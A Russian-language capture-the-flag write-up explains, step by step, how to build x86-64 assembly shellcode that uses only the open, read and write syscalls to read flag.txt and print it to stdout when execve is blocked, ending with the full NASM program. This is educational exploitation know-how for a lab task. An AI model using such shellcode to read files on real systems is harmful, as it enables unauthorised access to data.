Ну поехали, еще один шеллкод:

Теперь мы не можем получить rce, так как syscall execve отсутствует. Есть только open, read и write. Что ж, алгоритм понтяен: открываем файл, читаем файл, пишем в stdout. Приступим.

Заходим на [сайтик](https://filippo.io/linux-syscall-table/) и смотрим. Начнем с open.

![iamge](/resourses/pwn2.png)

Видим, что в целом не сильно отилчается от execve. Надо только понимать, что flags и mode нас интересуют равными 0. (это гуглится). Но есть одна загвоздка. Строка 'flag.txt\x00' содержит 9 байт, а регистр у нас помещается только 8 (у нас 64-битная система). Поэтому фокус как в execve не прокатит. Однако нам ничего не мешает сначала на стек положить 0, а потом 'flag.txt', что уже как раз 8 байт. И тогда все будет ок. Давайте сделаем:

```
[section .text]

global _start

_start:
	;;; open
    mov rax, 2
    mov rcx, 0
	push rcx
    mov rcx, 8392585648256674918
	push rcx
	mov rdi, rsp
	mov rsi, 0
	mov rdx, 0
    syscall
```

В rax мы положили 2, так как нас интересует колл опена, а он имеет номер 2. В левый регистр, в данном случае rcx, кладем 0, пушим на стек, кладем в него `u64(b'flag.txt')` (это число 8392585648256674918), пушим его на стек. В rdi передаем указатель на стек (вспоминаем из прошлого задания, что он находится в регистре rsp), в rsi и rdx кладем 0, вызываем syscall. Опен готов. Теперь в регистре rax у нас находится file_descriptor файла flag.txt, с помощью которого мы теперь можем прочитать файл. Теперь напишем read. Смотрим в табличку:

![image](/resourses/pwn3.png)

Видим, что в rdi нам нужен file descriptor, который у нас как раз в rax, в rsi нам нужен указатель на то, куда мы поместим прочитанные символы, а в rdx - количество читаемых символов.
Начнем с простого: в rdi поместим fd: `mov rdi, rax`. Давайте прочтем 0x100 символов: `mov rdx 0x100`. А теперь нам нужен указатель на буфер. На самом деле это сделать несложно: надо вычесть из адреса стека столько, сколько мы собираемся прочитать и передать адрес стека в регистр rsi. Вычитаем: `sub rsp, 0x100`, передаем в rsi: `mov rsi, rsp`. Ну и в rax надо пометсить 0, чтобы syscall мог вызвать read: `mov rax, 0`. Готово, теперь у нас на стеке лежит некоторое количество (0х100) символов из файла flag.txt. Что будет, если там нет столько символов? Он начнет читать какой то мусор, я сам не очень понимаю, что конкретно он читает. Но перед тем, как читать мусор, он прочитает файл. Полный код read:

```asm
    mov rdi, rax
	mov rdx, 0x100
	sub rsp, 0x100
	mov rsi, rsp
	mov rax, 0
	syscall
```

Остался write. Смотрим в табличку: 

![image](/resourses/pwn4.png)

В rdi надо передать fd. В нашем случае нам нужен stdout. Погуглив, понимаем, что надо просто передать 1 в этот регистр. В rsi надо поместить буфер - в нашем случае указатель на стек, а в rdx - количество символов (0x100). Вроде просто, поэтому выложу код сразу всей программы:

```
[section .text]

global _start

_start:
	mov rax, 2
    mov rcx, 0
	push rcx
	mov rcx, 8392585648256674918
	push rcx
	mov rdi, rsp
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rdi, rax
	mov rdx, 0x100
	sub rsp, 0x100
	mov rsi, rsp
	mov rax, 0
	syscall
	mov rax, 1
	mov rdi, 1
	mov rsi, rsp
	mov rdx, 0x100
	syscall
```

Компилируем с помощью скрипта из предыдущей задачи, меняем порт на нужный в e.py и получаем флаг вместе с мусором!